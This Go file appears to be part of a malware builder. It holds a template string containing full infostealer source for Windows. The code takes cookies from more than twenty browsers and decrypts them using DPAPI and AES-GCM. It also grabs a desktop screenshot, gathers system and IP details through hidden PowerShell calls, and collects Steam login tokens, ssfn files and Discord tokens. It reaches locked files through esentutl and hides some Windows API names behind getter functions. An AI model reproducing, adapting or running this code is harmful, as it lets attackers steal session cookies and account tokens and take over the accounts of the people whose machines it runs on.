package buildergen

import "strings"

func templateStealer() string {
	return strings.TrimSpace(`


func runStealer() string {
	results := map[string]string{}
	var diagErrors []string

	browsers := []struct {
		name  string
		paths []string
		exe   string
	}{
		{"Chrome", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		}, "chrome.exe"},
		{"Edge", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		}, "msedge.exe"},
		{"Brave", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		}, "brave.exe"},
		{"Opera", []string{
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
		}, "opera.exe"},
		{"OperaGX", []string{
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
		}, "opera.exe"},
		{"Vivaldi", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
		}, "vivaldi.exe"},
		{"Yandex", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
		}, "browser.exe"},
		{"Chromium", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"),
		}, "chrome.exe"},
		{"CocCoc", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
		}, "browser.exe"},
		{"Torch", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Torch", "User Data"),
		}, "torch.exe"},
		{"Epic", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
		}, "epic.exe"},
		{"CentBrowser", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
		}, "chrome.exe"},
		{"Iridium", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data"),
		}, "iridium.exe"},
		{"7Star", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
		}, "7star.exe"},
		{"Amigo", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Amigo", "User Data"),
		}, "amigo.exe"},
		{"Kometa", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Kometa", "User Data"),
		}, "kometa.exe"},
		{"Orbitum", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
		}, "orbitum.exe"},
		{"Sputnik", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
		}, "sputnik.exe"},
		{"Uran", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
		}, "uran.exe"},
		{"Firefox", []string{
			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		}, "firefox.exe"},
		{"Waterfox", []string{
			filepath.Join(os.Getenv("APPDATA"), "Waterfox", "Profiles"),
		}, "waterfox.exe"},
		{"PaleMoon", []string{
			filepath.Join(os.Getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
		}, "palemoon.exe"},
	}

	for _, br := range browsers {
		for _, basePath := range br.paths {
			if _, err := os.Stat(basePath); os.IsNotExist(err) {
				continue
			}

			var cookies string
			var errs []string
			if br.name == "Firefox" || br.name == "Waterfox" || br.name == "PaleMoon" {
				cookies, errs = stealFirefoxCookies(basePath, br.exe)
			} else {
				cookies, errs = stealChromiumCookies(basePath, br.name, br.exe)
			}
			diagErrors = append(diagErrors, errs...)

			if cookies != "" {
				if prev, ok := results[br.name]; ok {
					results[br.name] = prev + "\n" + cookies
				} else {
					results[br.name] = cookies
				}
			}
		}
	}

	if scr := stealScreenshot(); scr != "" {
		results["_screenshot"] = scr
	}

	if info := stealUserInfo(); info != "" {
		results["_userinfo"] = info
	}

	if steam := stealSteamTokens(); steam != "" {
		results["_steam"] = steam
	}

	if discord := stealDiscordTokens(); discord != "" {
		results["_discord"] = discord
	}

	if len(diagErrors) > 0 {
		results["_errors"] = strings.Join(diagErrors, "; ")
	}

	if len(results) == 0 {
		results["_errors"] = "no data collected"
	}

	out, _ := json.Marshal(results)
	return string(out)
}

func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
	var allCookies strings.Builder
	var errs []string

	for _, profile := range profiles {
		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			cookiePath = filepath.Join(userDataPath, profile, "Cookies")
			if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
				continue
			}
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s query: %v", browserName, profile, err))
			db.Close()
			continue
		}

		rowCount := 0
		for rows.Next() {
			var host, name, path string
			var encValue []byte
			var expires int64
			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
				errs = append(errs, fmt.Sprintf("%s/%s scan: %v", browserName, profile, err))
				continue
			}
			rowCount++

			value := decryptCookieValue(encValue, userDataPath)

			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expires))
		}
		rows.Close()
		db.Close()

		if rowCount == 0 {
			errs = append(errs, fmt.Sprintf("%s/%s: 0 rows", browserName, profile))
		}
	}

	return allCookies.String(), errs
}

func stealFirefoxCookies(profilesPath string, browserExe string) (string, []string) {
	var allCookies strings.Builder
	var errs []string

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return "", []string{"firefox readdir: " + err.Error()}
	}

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		cookiePath := filepath.Join(profilesPath, e.Name(), "cookies.sqlite")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			continue
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath, "firefox.exe"); err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", "firefox.exe")
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", "firefox.exe")
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s query: %v", e.Name(), err))
			db.Close()
			continue
		}

		for rows.Next() {
			var host, name, path, value string
			var expiry int64
			if err := rows.Scan(&host, &name, &path, &value, &expiry); err != nil {
				errs = append(errs, fmt.Sprintf("firefox/%s scan: %v", e.Name(), err))
				continue
			}
			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expiry))
		}
		rows.Close()
		db.Close()
	}

	return allCookies.String(), errs
}

func stealScreenshot() string {
	user32 := syscall.NewLazyDLL(getUser32DLL())
	gdi32 := syscall.NewLazyDLL(getGdi32DLL())
	getDesktopWindow := user32.NewProc(getGetDesktopWindowName())
	getDC := user32.NewProc(getGetDCName())
	releaseDC := user32.NewProc(getReleaseDCName())
	createCompatibleDC := gdi32.NewProc(getCreateCompatibleDCName())
	createCompatibleBitmap := gdi32.NewProc(getCreateCompatibleBitmapName())
	selectObject := gdi32.NewProc(getSelectObjectName())
	bitBlt := gdi32.NewProc(getBitBltName())
	getDeviceCaps := gdi32.NewProc(getGetDeviceCapsName())
	deleteDC := gdi32.NewProc(getDeleteDCName())
	deleteObject := gdi32.NewProc(getDeleteObjectName())
	getDIBits := gdi32.NewProc(getGetDIBitsName())

	hwnd, _, _ := getDesktopWindow.Call()
	hdc, _, _ := getDC.Call(hwnd)
	if hdc == 0 {
		return ""
	}
	defer releaseDC.Call(hwnd, hdc)

	width, _, _ := getDeviceCaps.Call(hdc, 8)
	height, _, _ := getDeviceCaps.Call(hdc, 10)
	if width == 0 || height == 0 {
		return ""
	}

	memDC, _, _ := createCompatibleDC.Call(hdc)
	if memDC == 0 {
		return ""
	}
	defer deleteDC.Call(memDC)

	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, width, height)
	if hBitmap == 0 {
		return ""
	}
	defer deleteObject.Call(hBitmap)

	selectObject.Call(memDC, hBitmap)
	bitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)

	type bitmapInfoHeader struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}

	bi := bitmapInfoHeader{
		BiSize:     40,
		BiWidth:    int32(width),
		BiHeight:   -int32(height),
		BiPlanes:   1,
		BiBitCount: 32,
	}

	dataSize := int(width) * int(height) * 4
	pixelData := make([]byte, dataSize)
	getDIBits.Call(memDC, hBitmap, 0, height, uintptr(unsafe.Pointer(&pixelData[0])), uintptr(unsafe.Pointer(&bi)), 0)

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			off := (y*int(width) + x) * 4
			if off+3 < len(pixelData) {
				img.Pix[(y*int(width)+x)*4+0] = pixelData[off+2]
				img.Pix[(y*int(width)+x)*4+1] = pixelData[off+1]
				img.Pix[(y*int(width)+x)*4+2] = pixelData[off+0]
				img.Pix[(y*int(width)+x)*4+3] = 255
			}
		}
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 70}); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func stealUserInfo() string {
	hostname, _ := os.Hostname()
	username := getUserName()
	ip := getPublicIP()
	country := getCountryByIP(ip)

	hiddenCmd := func(name string, args ...string) string {
		cmd := exec.Command(name, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		o, err := cmd.Output()
		if err != nil {
			return ""
		}
		return strings.TrimSpace(string(o))
	}

	osName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetOs())
	cpuName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetCpu())
	gpuName := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetGpu())
	ramSize := ""
	ramBytes := hiddenCmd(getPowerShellExeName(), "-NoProfile", "-Command", getPsGetRam())
	if v, err := strconv.ParseInt(ramBytes, 10, 64); err == nil {
		ramSize = fmt.Sprintf("%d GB", v/1024/1024/1024)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))
	sb.WriteString(fmt.Sprintf("Username: %s\n", username))
	sb.WriteString(fmt.Sprintf("IP: %s\n", ip))
	sb.WriteString(fmt.Sprintf("Country: %s\n", country))
	sb.WriteString(fmt.Sprintf("OS: %s\n", osName))
	sb.WriteString(fmt.Sprintf("CPU: %s\n", cpuName))
	sb.WriteString(fmt.Sprintf("GPU: %s\n", gpuName))
	sb.WriteString(fmt.Sprintf("RAM: %s\n", ramSize))
	return sb.String()
}

func stealSteamTokens() string {
	var sb strings.Builder

	var hKey syscall.Handle
	keyPath, _ := syscall.UTF16PtrFromString(`Software\Valve\Steam\ConnectCache`)
	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
	if err == nil {
		defer syscall.RegCloseKey(hKey)
		advapi32 := syscall.NewLazyDLL("advapi32.dll")
		regEnumValue := advapi32.NewProc("RegEnumValueW")
		for idx := uint32(0); ; idx++ {
			nameLen := uint32(256)
			nameBuf := make([]uint16, nameLen)
			dataLen := uint32(8192)
			dataBuf := make([]byte, dataLen)
			var vtype uint32
			r, _, _ := regEnumValue.Call(
				uintptr(hKey),
				uintptr(idx),
				uintptr(unsafe.Pointer(&nameBuf[0])),
				uintptr(unsafe.Pointer(&nameLen)),
				0,
				uintptr(unsafe.Pointer(&vtype)),
				uintptr(unsafe.Pointer(&dataBuf[0])),
				uintptr(unsafe.Pointer(&dataLen)),
			)
			if r != 0 {
				break
			}
			name := syscall.UTF16ToString(nameBuf[:nameLen])
			token := string(dataBuf[:dataLen])
			for len(token) > 0 && token[len(token)-1] == 0 {
				token = token[:len(token)-1]
			}
			token = strings.TrimSpace(token)
			if len(token) > 50 && strings.Contains(token, ".") {
				sb.WriteString(fmt.Sprintf("[%s] %s\n", name, token))
			}
		}
	}

	var steamPaths []string
	seen := map[string]bool{}
	addPath := func(p string) {
		p = filepath.Clean(p)
		if p == "." || p == "" { return }
		lp := strings.ToLower(p)
		if seen[lp] { return }
		seen[lp] = true
		steamPaths = append(steamPaths, p)
	}
	if v := os.Getenv("ProgramFiles(x86)"); v != "" { addPath(filepath.Join(v, "Steam")) }
	if v := os.Getenv("ProgramFiles"); v != "" { addPath(filepath.Join(v, "Steam")) }
	if v := os.Getenv("LOCALAPPDATA"); v != "" { addPath(filepath.Join(v, "Steam")) }
	for d := 'A'; d <= 'Z'; d++ {
		drive := string(d) + ":\\"
		addPath(filepath.Join(drive, "Steam"))
		addPath(filepath.Join(drive, "Program Files", "Steam"))
		addPath(filepath.Join(drive, "Program Files (x86)", "Steam"))
		addPath(filepath.Join(drive, "Games", "Steam"))
		addPath(filepath.Join(drive, "SteamLibrary"))
		addPath(filepath.Join(drive, "Valve", "Steam"))
	}

	for _, steamDir := range steamPaths {
		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
		loginFile := filepath.Join(steamDir, "config", "loginusers.vdf")
		if data, err := os.ReadFile(loginFile); err == nil && len(data) > 0 {
			sb.WriteString(fmt.Sprintf("=== loginusers.vdf [%s] ===\n", steamDir))
			sb.WriteString(string(data))
			sb.WriteString("\n\n")
		}
		entries, err := os.ReadDir(steamDir)
		if err == nil {
			for _, e := range entries {
				if strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
					ssfnPath := filepath.Join(steamDir, e.Name())
					if data, err := os.ReadFile(ssfnPath); err == nil {
						sb.WriteString(fmt.Sprintf("=== %s [%s] ===\n", e.Name(), steamDir))
						sb.WriteString(base64.StdEncoding.EncodeToString(data))
						sb.WriteString("\n\n")
					}
				}
			}
		}
	}
	return sb.String()
}

func stealDiscordTokens() string {
	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")
	if appdata == "" && localAppdata == "" {
		return ""
	}

	var dirs []string

	discordApps := []string{
		filepath.Join(appdata, "Discord"),
		filepath.Join(appdata, "discordcanary"),
		filepath.Join(appdata, "discordptb"),
		filepath.Join(appdata, "Lightcord"),
	}
	for _, app := range discordApps {
		dirs = append(dirs, filepath.Join(app, "Local Storage", "leveldb"))
	}

	browserBases := []string{
		filepath.Join(localAppdata, "Google", "Chrome", "User Data"),
		filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"),
		filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(localAppdata, "Vivaldi", "User Data"),
		filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data"),
		filepath.Join(localAppdata, "Chromium", "User Data"),
		filepath.Join(localAppdata, "CocCoc", "Browser", "User Data"),
		filepath.Join(localAppdata, "Torch", "User Data"),
		filepath.Join(localAppdata, "Epic Privacy Browser", "User Data"),
		filepath.Join(localAppdata, "CentBrowser", "User Data"),
		filepath.Join(localAppdata, "Iridium", "User Data"),
		filepath.Join(localAppdata, "7Star", "7Star", "User Data"),
		filepath.Join(localAppdata, "Amigo", "User Data"),
		filepath.Join(localAppdata, "Kometa", "User Data"),
		filepath.Join(localAppdata, "Orbitum", "User Data"),
		filepath.Join(localAppdata, "Sputnik", "Sputnik", "User Data"),
		filepath.Join(localAppdata, "uCozMedia", "Uran", "User Data"),
		filepath.Join(appdata, "Opera Software", "Opera Stable"),
		filepath.Join(appdata, "Opera Software", "Opera GX Stable"),
	}

	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
	for _, base := range browserBases {
		for _, prof := range profiles {
			dirs = append(dirs, filepath.Join(base, prof, "Local Storage", "leveldb"))
		}
	}

	tokenSet := map[string]bool{}
	var tokens []string

	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			ext := strings.ToLower(filepath.Ext(e.Name()))
			if ext != ".ldb" && ext != ".log" {
				continue
			}
			data, err := os.ReadFile(filepath.Join(dir, e.Name()))
			if err != nil {
				continue
			}
			content := string(data)
			for _, line := range strings.Split(content, "\n") {
				for _, part := range strings.Split(line, "\"") {
					part = strings.TrimSpace(part)
					if len(part) == 0 {
						continue
					}
					if isDiscordToken(part) && !tokenSet[part] {
						tokenSet[part] = true
						tokens = append(tokens, part)
					}
				}
			}
		}
	}

	if len(tokens) == 0 {
		return ""
	}
	return strings.Join(tokens, "\n")
}

func isDiscordToken(s string) bool {
	s = strings.TrimSpace(s)
	if len(s) < 50 {
		return false
	}
	if strings.HasPrefix(s, "mfa.") && len(s) > 80 {
		for _, c := range s[4:] {
			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
				return false
			}
		}
		return true
	}
	parts := strings.SplitN(s, ".", 3)
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if len(p) < 6 {
			return false
		}
		for _, c := range p {
			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
				return false
			}
		}
	}
	return true
}

func decryptCookieValue(encValue []byte, userDataPath string) string {
	if len(encValue) == 0 {
		return ""
	}

	if len(encValue) > 3 && string(encValue[:3]) == "v10" {
		localStatePath := filepath.Join(userDataPath, "Local State")
		key := getChromiumKey(localStatePath)
		if key == nil {
			return "(encrypted)"
		}
		nonce := encValue[3:15]
		ciphertext := encValue[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return "(encrypted)"
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "(encrypted)"
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "(encrypted)"
		}
		return string(plain)
	}

	out, err := dpapiDecrypt(encValue)
	if err != nil {
		return "(encrypted)"
	}
	return string(out)
}

var chromiumKeyCache = map[string][]byte{}
var chromiumKeyCacheMu sync.Mutex

func getChromiumKey(localStatePath string) []byte {
	chromiumKeyCacheMu.Lock()
	defer chromiumKeyCacheMu.Unlock()

	if k, ok := chromiumKeyCache[localStatePath]; ok {
		return k
	}

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}

	osCrypt, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}
	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil
	}

	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return nil
	}
	encKey = encKey[5:]

	key, err := dpapiDecrypt(encKey)
	if err != nil {
		return nil
	}

	chromiumKeyCache[localStatePath] = key
	return key
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	proc := crypt32.NewProc("CryptUnprotectData")

	inBlob := cryptDataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	var outBlob cryptDataBlob

	r, _, err := proc.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer func() {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		localFree := kernel32.NewProc("LocalFree")
		_, _, _ = localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	}()

	result := make([]byte, outBlob.cbData)
	copy(result, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return result, nil
}

func copyFileLocked(src, dst, browserExe string) error {
	_ = browserExe

	data, err := os.ReadFile(src)
	if err == nil && len(data) > 0 {
		return os.WriteFile(dst, data, 0o644)
	}

	srcPtr, _ := syscall.UTF16PtrFromString(src)
	const GENERIC_READ = 0x80000000
	const FILE_SHARE_ALL = 0x07
	const OPEN_EXISTING = 3
	const FILE_ATTRIBUTE_NORMAL = 0x80

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createFile := kernel32.NewProc("CreateFileW")
	readFile := kernel32.NewProc("ReadFile")
	getFileSize := kernel32.NewProc("GetFileSizeEx")
	closeHandle := kernel32.NewProc("CloseHandle")

	h, _, _ := createFile.Call(
		uintptr(unsafe.Pointer(srcPtr)),
		GENERIC_READ,
		FILE_SHARE_ALL,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if h != 0 && h != ^uintptr(0) {
		defer closeHandle.Call(h)
		var size int64
		getFileSize.Call(h, uintptr(unsafe.Pointer(&size)))
		if size > 0 && size < 200*1024*1024 {
			buf := make([]byte, size)
			var bytesRead uint32
			readFile.Call(h, uintptr(unsafe.Pointer(&buf[0])), uintptr(size), uintptr(unsafe.Pointer(&bytesRead)), 0)
			if bytesRead > 0 {
				return os.WriteFile(dst, buf[:bytesRead], 0o644)
			}
		}
	}

	cmd := exec.Command("esentutl.exe", "/y", src, "/d", dst, "/o")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Run(); err == nil {
		check, _ := os.ReadFile(dst)
		if len(check) > 0 {
			return nil
		}
	}

	return fmt.Errorf("locked %s", src)
}
`)
}
